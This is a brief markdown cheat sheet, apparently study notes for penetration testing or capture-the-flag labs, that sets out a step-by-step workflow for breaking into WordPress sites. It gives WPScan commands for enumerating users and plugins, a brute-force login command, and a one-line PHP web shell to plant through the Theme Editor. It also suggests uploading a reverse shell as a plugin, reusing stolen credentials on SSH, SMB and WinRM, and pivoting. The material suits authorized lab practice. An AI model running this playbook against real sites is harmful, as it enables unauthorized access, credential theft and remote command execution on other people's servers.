# WordPress Enumeration & Exploitation

## Purpose

Structured workflow for identifying and exploiting WordPress applications.

Core rules:

* Enumerate users early
* Target plugins/themes
* Credential attacks are very effective

---

## 0. Identify WordPress

Look for:

* /wp-login.php
* /wp-admin
* page source references to wp-content

---

## 1. WPScan (PRIMARY TOOL)

```bash
wpscan --url http://<IP> --enumerate u
```

```bash
wpscan --url http://<IP> --enumerate p,t
```

---

## 2. User Enumeration

```bash
wpscan --url http://<IP> -e u
```

Manual:

```bash
http://<IP>/?author=1
```

---

## 3. Plugin Enumeration

```bash
wpscan --url http://<IP> -e p
```

Check versions → search exploits

---

## 4. Brute Force Login

```bash
wpscan --url http://<IP> -U users.txt -P passwords.txt
```

---

## 5. Login Access

```text
/wp-login.php
```

---

## 6. Webshell via Theme Editor

Dashboard:

* Appearance → Theme Editor

Add:

```php
<?php system($_GET['cmd']); ?>
```

---

## 7. Upload Reverse Shell

* Plugins → Add New → Upload

---

## 8. File Upload Vulnerabilities

Check:

* plugins
* forms
* media upload

---

## 9. Credential Reuse

Test WordPress creds on:

* SSH
* SMB
* WinRM

---

## 10. Pivot Opportunities

WordPress can reveal:

* DB credentials
* system users
* file paths

---

## 11. If Stuck

* re-run WPScan
* search plugin exploits
* brute force login

---

## 12. Mental Model

* WordPress = plugin attack surface
* Users = entry point
* Admin = code execution

---

## 13. Golden Rules

* Always run WPScan
* Always enumerate users
* Always check plugins
* Always try login
